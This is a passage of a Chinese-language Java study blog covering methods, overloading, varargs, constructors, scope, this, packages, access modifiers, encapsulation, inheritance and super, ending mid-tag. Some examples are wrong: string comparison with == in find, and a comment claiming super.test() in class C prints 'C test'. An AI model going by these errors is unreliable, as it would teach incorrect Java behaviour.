&#123;<br>    <span class="hljs-keyword">void</span> <span class="hljs-title function_">miao</span><span class="hljs-params">()</span>&#123;<br>        System.out.println(<span class="hljs-string">&quot;喵&quot;</span>);<br>        <span class="hljs-keyword">return</span>；（可以省略）<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><h3 id="返回值"><a href="#返回值" class="headerlink" title="返回值"></a>返回值</h3><p>一个方法只能返回一个值，要返回多个值可以用数组，可以为任意类型，包括基本数据类型和引用类型，<strong>返回值类型必须和 return 的值类型一致或兼容</strong></p><p>当函数没有返回值时，return 可以省略</p><h3 id="参数（类比C语言）"><a href="#参数（类比C语言）" class="headerlink" title="参数（类比C语言）"></a>参数（类比C语言）</h3><p>一个方法可以没有参数或多个参数，中间用逗号隔开（类比C语言）</p><h3 id="方法体"><a href="#方法体" class="headerlink" title="方法体"></a>方法体</h3><p>类比C语言函数体</p><p><strong>不可以在方法体内部定义方法</strong></p><h3 id="方法传参机制"><a href="#方法传参机制" class="headerlink" title="方法传参机制"></a>方法传参机制</h3><p><strong>a.方法嵌套顺序</strong></p><p>执行方法时会独立开辟栈空间,执行完毕或执行到 return 时，就会返回到调用方法的地方，返回后继续执行后面的代码，main 方法执行完毕，程序结束</p><p><strong>b.值传递&#x2F;值拷贝，形参任何改变不影响实参</strong></p><p><strong>c.引用传递，传递地址，形参改变可能影响实参</strong></p><p><strong>d.String 的传递</strong></p><h2 id="属性"><a href="#属性" class="headerlink" title="属性"></a>属性</h2><p>属性（成员变量&#x2F;字段&#x2F; field ）的概念</p><p>属性定义语法与变量一致，多了访问修饰符</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">访问修饰符 属性类型 属性名<br></code></pre></td></tr></table></figure><p>属性类型可以为任意类型，可以是基本数据类型和引用类型，如果没有初始化，有默认值，和数组一致</p><h3 id="Static"><a href="#Static" class="headerlink" title="Static"></a>Static</h3><h4 id="静态属性（类属性）与实例属性（对象属性）"><a href="#静态属性（类属性）与实例属性（对象属性）" class="headerlink" title="静态属性（类属性）与实例属性（对象属性）"></a>静态属性（类属性）与实例属性（对象属性）</h4><p>静态属性，只有一份，可以通过 <strong>类名.属性名&#x2F;对象.属性名</strong>来赋值和访问</p><p>实例属性，每个对象有一份，只能通过 <strong>对象.属性名</strong>来赋值和访问</p><h4 id="静态方法和实例方法（对象方法）"><a href="#静态方法和实例方法（对象方法）" class="headerlink" title="静态方法和实例方法（对象方法）"></a>静态方法和实例方法（对象方法）</h4><p>静态方法只能调用静态方法，不能访问实例属性</p><p>实例方法中可以调用静态方法和实例方法，也可以访问静态属性和实例属性</p><h4 id="补全method方法"><a href="#补全method方法" class="headerlink" title="补全method方法"></a>补全method方法</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java">System.out.println(method(method(<span class="hljs-number">100.2</span>,<span class="hljs-number">1.0</span>),<span class="hljs-number">100</span>))<br><br><span class="hljs-keyword">static</span> <span class="hljs-type">double</span> <span class="hljs-title function_">method</span><span class="hljs-params">(<span class="hljs-type">double</span> a,<span class="hljs-type">double</span> b)</span>&#123;<br>  <span class="hljs-keyword">return</span> a+b;<br> &#125;<br></code></pre></td></tr></table></figure><p>e.g.</p><p>定义一个find方法，实现对字符串数组元素进行查找，并返回索引，找不到返回-1；</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs java">String[] a=<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[]&#123;<span class="hljs-string">&quot;a&quot;</span>,<span class="hljs-string">&quot;b&quot;</span>,<span class="hljs-string">&quot;c&quot;</span>&#125;;<br>  String b=<span class="hljs-string">&quot;c&quot;</span>;<br>  System.out.println(find(a,b));<br>  <br> &#125;<br>    <span class="hljs-keyword">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">find</span><span class="hljs-params">(String[] a,String b)</span> &#123;<br>      <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; a.length; i++) &#123;<br>        <span class="hljs-keyword">if</span> (a[i] == b) &#123;<br>          <span class="hljs-keyword">return</span> i;<br>        &#125;<br>      &#125;<br>      <span class="hljs-keyword">return</span> -<span class="hljs-number">1</span>;<br>    &#125;<br></code></pre></td></tr></table></figure><h1 id="重载"><a href="#重载" class="headerlink" title="重载"></a>重载</h1><p>同一个类中，允许存在一个以上的同名方法，只要它们的参数个数或者参数类型，参数顺序不同即可，<strong>与返回值类型无关</strong>，只看参数列表</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Hello</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>       <br>        System.out.println(<span class="hljs-string">&quot;abc0&quot;</span>);<br>        System.out.println(<span class="hljs-string">&#x27;a&#x27;</span>);<br>        System.out.println(<span class="hljs-literal">false</span>);<br>        System.out.println(<span class="hljs-number">1000.1</span>);<br>        System.out.println(<span class="hljs-number">123</span>);<br>        test(<span class="hljs-string">&quot;x&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">test</span><span class="hljs-params">(String a)</span>&#123;<br>        System.out.println(a);<br>    &#125;<br>    <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">test</span><span class="hljs-params">(<span class="hljs-type">int</span> a)</span>&#123;<br>        System.out.println(a);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="可变参数"><a href="#可变参数" class="headerlink" title="可变参数"></a>可变参数</h1><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">int</span> <span class="hljs-title function_">sum</span><span class="hljs-params">(<span class="hljs-type">int</span>... nums)</span>&#123; &#125;<br></code></pre></td></tr></table></figure><p>可变参数本质就是数组，实参可以为0个或任意多个</p><p>可变参数的实参可以为数组，这时候只能传一个参数</p><p>形参列表中只能出现一个可变参数</p><p>可变参数可以和普通参数以前放在形参列表，但必须保证可变参数在最后一个西餐列表中只能出现一个可变参数</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>       <br>       <span class="hljs-type">int</span>[] a=<span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,<span class="hljs-number">5</span>,<span class="hljs-number">6</span>,<span class="hljs-number">7</span>,<span class="hljs-number">8</span>,<span class="hljs-number">9</span>,<span class="hljs-number">10</span>&#125;;<br>        System.out.println(sum(<span class="hljs-string">&quot;java&quot;</span>,<span class="hljs-string">&quot;cpp&quot;</span>,a));<br>    &#125;<br>    <span class="hljs-keyword">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">sum</span><span class="hljs-params">(String d,String b,<span class="hljs-type">int</span>... a)</span>&#123;<br>        <span class="hljs-type">int</span> result=<span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;a.length;i++)&#123;<br>            result+=a[i];<br>        &#125;<br>        <span class="hljs-keyword">return</span> result;<br>    &#125;<br></code></pre></td></tr></table></figure><h1 id="构造器-构造方法-构造函数"><a href="#构造器-构造方法-构造函数" class="headerlink" title="构造器&#x2F;构造方法&#x2F;构造函数"></a>构造器&#x2F;构造方法&#x2F;构造函数</h1><h2 id="构造器特点"><a href="#构造器特点" class="headerlink" title="构造器特点"></a>构造器特点</h2><p>与类名一致，<strong>无返回值</strong>；</p><p>当对象创建时，会自动调用对应的构造器</p><p>如果没有定义构造器，会自动生成默认的无参构造器（默认构造器）</p><p>一个类可以定义多个不同的构造器，即构造器重载</p><p>一旦定义了构造器，默认的构造器就覆盖了，就不能再使用默认的无参构造器，除非自己显示的定义一下</p><h2 id="对象创建流程"><a href="#对象创建流程" class="headerlink" title="对象创建流程"></a>对象创建流程</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Person</span>&#123;<br>       <span class="hljs-type">int</span> age=<span class="hljs-number">90</span>;<br>       String name;<br>       Person(String n,<span class="hljs-type">int</span> a)&#123;<br>           name=n;<br>           age=a;<br>       &#125;<br>   &#125;<br>   Person p=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>(<span class="hljs-string">&quot;abc&quot;</span>,<span class="hljs-number">31</span>);<br></code></pre></td></tr></table></figure><p>加载 Person 类信息，只会加载一次</p><p>在堆中分配空间（地址）</p><p>完成对象初始化</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java">默认初始化   age=<span class="hljs-number">0</span>   name=<span class="hljs-literal">null</span><br>显示初始化   age=<span class="hljs-number">90</span>   name=<span class="hljs-literal">null</span><br>构造器初始化   age=<span class="hljs-number">31</span>   name=abc<br></code></pre></td></tr></table></figure><p>在对象在堆中的地址，返回给 p (p是对象名，也可以理解成是对象的引用)</p><h1 id="变量作用域"><a href="#变量作用域" class="headerlink" title="变量作用域"></a>变量作用域</h1><h2 id="全局变量"><a href="#全局变量" class="headerlink" title="全局变量"></a>全局变量</h2><p>属性（成员变量），可以被本类或其他类使用</p><p>可以加访问修饰符</p><p>有默认值，可以不赋值直接使用</p><p>生命周期长，伴随着对象的创建而创建，销毁而销毁</p><h2 id="局部变量"><a href="#局部变量" class="headerlink" title="局部变量"></a>局部变量</h2><p>不可加修饰符</p><p>没有默认值，需要赋值使用</p><p>生命周期短，伴随代码块执行而创建，结束而销毁</p><h2 id="块级作用域"><a href="#块级作用域" class="headerlink" title="块级作用域"></a>块级作用域</h2><p><strong>static静态代码块（最先执行）</strong>、构造代码块、方法代码块、局部代码块、语句代码块</p><p><strong>属性和局部变量可以重名</strong>，优先使用局部变量，在<strong>同一个作用域中两个局部变量不能重名</strong></p><h1 id="this"><a href="#this" class="headerlink" title="this"></a>this</h1><ul><li><p>代表当前对象，打印对象的 hashCode，哪个对象调用方法，this 就指哪个对象</p></li><li><p>this 用于区分当前对象的属性和局部变量</p></li><li><p>this 不能在类外部使用，<strong>只能在类内部实例方法中使用</strong>，静态方法不可使用</p></li><li><p>类内部赋值和获取实例属性</p></li></ul><h2 id="类内部调用方法"><a href="#类内部调用方法" class="headerlink" title="类内部调用方法"></a>类内部调用方法</h2><p>方法名（实参列表）</p><p>​this.方法名（实参列表）</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">void</span> <span class="hljs-title function_">test</span><span class="hljs-params">()</span>&#123;<br>      System.out.println(<span class="hljs-string">&quot;this:&quot;</span>+<span class="hljs-built_in">this</span>.hashCode());<br>  &#125;<br>  <span class="hljs-keyword">void</span> <span class="hljs-title function_">test1</span><span class="hljs-params">()</span>&#123;<br>      <span class="hljs-built_in">this</span>.test();<br>      System.out.println(<span class="hljs-string">&quot;this:&quot;</span>+<span class="hljs-built_in">this</span>.hashCode());<br>  &#125;<br> <br></code></pre></td></tr></table></figure><h2 id="this方法"><a href="#this方法" class="headerlink" title="this方法"></a>this方法</h2><p>this（实参列表）</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-title function_">Cat</span><span class="hljs-params">(String name)</span>&#123;<br>       <span class="hljs-built_in">this</span>(name,<span class="hljs-number">30</span>);<span class="hljs-comment">//必须放在第一行才能使用</span><br>       <span class="hljs-built_in">this</span>.name=name;<br>       System.out.println(<span class="hljs-built_in">this</span>.name);<br>       System.out.println(<span class="hljs-string">&quot;this&quot;</span>+<span class="hljs-built_in">this</span>.hashCode());<br>   &#125;<br>   <span class="hljs-keyword">public</span> <span class="hljs-title function_">Cat</span><span class="hljs-params">(String dname,<span class="hljs-type">int</span> age)</span>&#123;<br>       <span class="hljs-built_in">this</span>.age=age;<br>       System.out.println(<span class="hljs-string">&quot;Cat(String dname,int agr)&quot;</span>);<br>   &#125;<br></code></pre></td></tr></table></figure><h1 id="包"><a href="#包" class="headerlink" title="包"></a>包</h1><h2 id="作用"><a href="#作用" class="headerlink" title="作用"></a>作用</h2><p>区分相同名字类，方便管理，控制访问范围</p><h2 id="建包"><a href="#建包" class="headerlink" title="建包"></a>建包</h2><p>建立不同的文件夹&#x2F;目录来保存类文件</p><h2 id="打包"><a href="#打包" class="headerlink" title="打包"></a>打包</h2><p>基本语法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.butterfly.app<br><span class="hljs-keyword">package</span> <span class="hljs-comment">//关键字</span><br>com.butterfly.app <span class="hljs-comment">//包名</span><br></code></pre></td></tr></table></figure><p>package 的作用是声明当前类所在的包，<strong>一个类只能有一个 package</strong></p><h2 id="导包"><a href="#导包" class="headerlink" title="导包"></a>导包</h2><p>import 指令位置放在 package 下，在类定义前面，可以有多句且没有顺序要求</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.util.*;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br>java.lang.*  是基本包，默认引入，不需要再引入<br></code></pre></td></tr></table></figure><h1 id="访问修饰符"><a href="#访问修饰符" class="headerlink" title="访问修饰符"></a>访问修饰符</h1><p>控制属性和方法的访问权限</p><p>修饰类的属性，成员方法及类</p><p>只有默认的和 public 才能修饰类，并且遵循上述访问权限的特点</p><table><thead><tr><th></th><th>本类</th><th>同包</th><th>子类</th><th>不同包</th></tr></thead><tbody><tr><td>public</td><td>√</td><td>√</td><td>√</td><td>√</td></tr><tr><td>protected</td><td>√</td><td>√</td><td>√</td><td>×</td></tr><tr><td>private</td><td>√</td><td>×</td><td>×</td><td>×</td></tr><tr><td>没有修饰符</td><td>√</td><td>√</td><td>×</td><td>×</td></tr></tbody></table><h1 id="封装"><a href="#封装" class="headerlink" title="封装"></a>封装</h1><p>把属性私有，定义公开的 get、set 方法来验证数据合理性</p><p>e.g</p><p>定义 Account 类，要求具有属性：姓名 name（长度为2-4，初始化后不可修改）、余额 balance（必须大于20）、密码 password（必须是六位）。如果不满足，则给出提示信息，并给默认值</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><code class="hljs java">Account.java<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Account</span> &#123;<br>    <span class="hljs-keyword">private</span> String name=<span class="hljs-literal">null</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-type">double</span> balance=<span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">private</span> String password=<span class="hljs-literal">null</span>;<br>    <br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getName</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> name;<br>    &#125;<br>    <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setName</span><span class="hljs-params">(String name)</span> &#123;<br>        <span class="hljs-keyword">if</span>(name==<span class="hljs-literal">null</span>)&#123;<br>            System.out.println(<span class="hljs-string">&quot;名字不能设置为null&quot;</span>);<br>            <span class="hljs-keyword">return</span>;<br>        &#125;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-built_in">this</span>.name!=<span class="hljs-literal">null</span>)&#123;<br>            System.out.println(<span class="hljs-string">&quot;名字只能修改一次&quot;</span>);<br>        &#125;<span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">if</span> (name.length() &lt; <span class="hljs-number">2</span> || name.length() &gt; <span class="hljs-number">4</span>) &#123;<br>                System.out.println(<span class="hljs-string">&quot;名字长度需要2-4位&quot;</span>);<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                <span class="hljs-built_in">this</span>.name = name;<br>            &#125;<br>        &#125;<br>       <br>    &#125;<br>    <br>    <span class="hljs-keyword">public</span> <span class="hljs-type">double</span> <span class="hljs-title function_">getBalance</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> balance;<br>    &#125;<br>    <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setBalance</span><span class="hljs-params">(<span class="hljs-type">double</span> balance)</span> &#123;<br>        <span class="hljs-keyword">if</span>(balance&lt;=<span class="hljs-number">20</span>)&#123;<br>            System.out.println(<span class="hljs-string">&quot;余额必须大于20&quot;</span>);<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-built_in">this</span>.balance = balance;<br>        &#125;<br>    &#125;<br>    <br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getPassword</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> password;<br>    &#125;<br>    <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setPassword</span><span class="hljs-params">(String password)</span> &#123;<br>        <span class="hljs-keyword">if</span>(password==<span class="hljs-literal">null</span>)&#123;<br>            System.out.println(<span class="hljs-string">&quot;password不能设置为null&quot;</span>);<br>            <span class="hljs-keyword">return</span>;<br>        &#125;<br>        <span class="hljs-keyword">if</span>(password.length()==<span class="hljs-number">6</span>)&#123;<br>            <span class="hljs-built_in">this</span>.password = password;<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            System.out.println(<span class="hljs-string">&quot;密码必须是六位&quot;</span>);<br>        &#125;<br>    &#125;<br>&#125;<br><br><br>Hello.java<br>Account account=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Account</span>();<br>        account.setName(<span class="hljs-string">&quot;null&quot;</span>);<br>        System.out.println(account.getName());<br>        account.setPassword(<span class="hljs-string">&quot;123456&quot;</span>);<br>        System.out.println(account.getPassword());<br><br></code></pre></td></tr></table></figure><h1 id="继承"><a href="#继承" class="headerlink" title="继承"></a>继承</h1><h2 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h2><figure class="highlight scala"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs scala"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">子类</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">父类</span></span>&#123;&#125;<br></code></pre></td></tr></table></figure><figure class="highlight scala"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs scala"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Student</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">Person</span></span>&#123;&#125;<br></code></pre></td></tr></table></figure><h2 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h2><p>a.     父类&#x2F;超类&#x2F;基类</p><p>​子类&#x2F;派生类</p><p>b. 多个类存在相同的属性和方法时，从中抽象出父类，在父类中定义相同的属性和方法，所有子类不需要再重新定义，只需要通过 extends 声明继承父类就行</p><p>c. 子类自动拥有父类的所有属性和方法（受访问修饰符影响）</p><p>d. 子类不能访问父类的属性和方法，可以通过父类的公开方法去访问，类似封装</p><p>e. 单继承机制，子类最多只能继承一个父类（直接继承），但是可以实现多个接口</p><p>f. 所有类都是 Object 的子类</p><p>g. 多次继承 查看方法</p><h2 id="练习"><a href="#练习" class="headerlink" title="练习"></a>练习</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">class</span> <span class="hljs-title class_">A</span>&#123;<br>        String name=<span class="hljs-string">&quot;AA&quot;</span>;<br>        <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> age=<span class="hljs-number">100</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">test</span><span class="hljs-params">()</span>&#123;<br>            System.out.println(<span class="hljs-string">&quot;A test&quot;</span>);<br>        &#125;<br>&#125;<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">B</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">A</span>&#123;<br>    String name=<span class="hljs-string">&quot;BB&quot;</span>;<br>    String java=<span class="hljs-string">&quot;java&quot;</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> nums=<span class="hljs-number">100</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">demo</span><span class="hljs-params">()</span>&#123;<br>        <span class="hljs-comment">//super可以访问的成员（属性和方法）</span><br>        System.out.println(<span class="hljs-built_in">super</span>.name); <span class="hljs-comment">//AA</span><br>        <span class="hljs-built_in">super</span>.test();       <span class="hljs-comment">//A test</span><br>        <span class="hljs-comment">//this可以访问的成员</span><br>        System.out.println(<span class="hljs-built_in">this</span>.java);  <span class="hljs-comment">//java</span><br>        System.out.println(<span class="hljs-built_in">this</span>.nums);  <span class="hljs-comment">//100</span><br>        System.out.println(<span class="hljs-built_in">this</span>.name);  <span class="hljs-comment">//BB</span><br>        <span class="hljs-comment">//this.demo();    //递归</span><br>        <span class="hljs-built_in">this</span>.test();<br>    &#125;<br>&#125;<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">C</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">B</span>&#123;<br>    String name=<span class="hljs-string">&quot;CC&quot;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">test</span><span class="hljs-params">()</span>&#123;<br>        System.out.println(<span class="hljs-string">&quot;C test&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">show</span><span class="hljs-params">()</span>&#123;<br>        <span class="hljs-comment">//super访问成员</span><br>        System.out.println(<span class="hljs-built_in">super</span>.java); <span class="hljs-comment">//java</span><br>        System.out.println(<span class="hljs-built_in">super</span>.name); <span class="hljs-comment">//BB</span><br>        <span class="hljs-built_in">super</span>.test();  <span class="hljs-comment">//C test</span><br>        <span class="hljs-built_in">super</span>.demo();<br>        <span class="hljs-comment">//this可以访问哪些成员</span><br>        System.out.println(<span class="hljs-built_in">this</span>.java);  <span class="hljs-comment">//java</span><br>        System.out.println(<span class="hljs-built_in">this</span>.name);  <span class="hljs-comment">//CC</span><br>        <span class="hljs-built_in">this</span>.test();    <span class="hljs-comment">//C test</span><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="父类构造器"><a href="#父类构造器" class="headerlink" title="父类构造器"></a>父类构造器</h2><p>创建子类对象时，默认会调用父类的无参构造器 super( );</p><p>如果父类没有提供无参构造器，须在子类构造器中用 super 去知道使用父类哪个构造器</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-built_in">super</span>(参数列表);<br>e.g.<br><span class="hljs-built_in">super</span>(name,age,sex);<br></code></pre></td></tr></table></figure><p><strong>super() 和 this() 都只能放在构造器第一行，因此不能共存在同一个构造器；</strong></p><p>3.父类构造器的调用不限于直接父类，一直往上追溯到 Object 类（顶级父类）</p><h2 id="super"><a href="#super" class="headerlink" title="super"></a>super</h2><p>用处</p><p>a) 子类和父类具有同名属性和方法时，<strong>默认使用子类的同名属性和方法</strong>。访问父类的属性或方法必须通过 super 来调用</p><p>b) super 代表父类对象的引用，用于访问父类对象的属性、方法、构造器</p><p>访问父类的属性（受访问修饰符影响）</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-built_in">super</span>.属性名；<br></code></pre></td></tr></table></figure><p>访问父类的方法（受访问修饰符影响）</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-built_in">super</span>.方法名（参数列表）；<br></code></pre></td></tr></table></figure><p>访问父类的构造器</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-built_in">super</span>（参数列表）；<br></code></pre></td></tr></table></figure><h1 id="方法重写"><a href="#方法重写" class="headerlink" title="方法重写"></a>方法重写</h1><p>子类可以重写方法和属性</p><h2 id="方法重写特点"><a href="#方法重写特点" class="headerlink" title="方法重写特点"></a>方法重写特点</h2><ul><li><p>也称为方法覆盖</p></li><li><p>子类方法的名称、参数、与父类完全相同</p></li><li><p>返回类型和父类一样，或则是父类返回类型的子类，比如父类返回类型是 Object，子类返回方法类型是 String</p></li><li><p>子类方法不能缩小父类方法的访问权限</p></li></ul><h2 id="重载与重写的区别"><a href="#重载与重写的区别" class="headerlink" 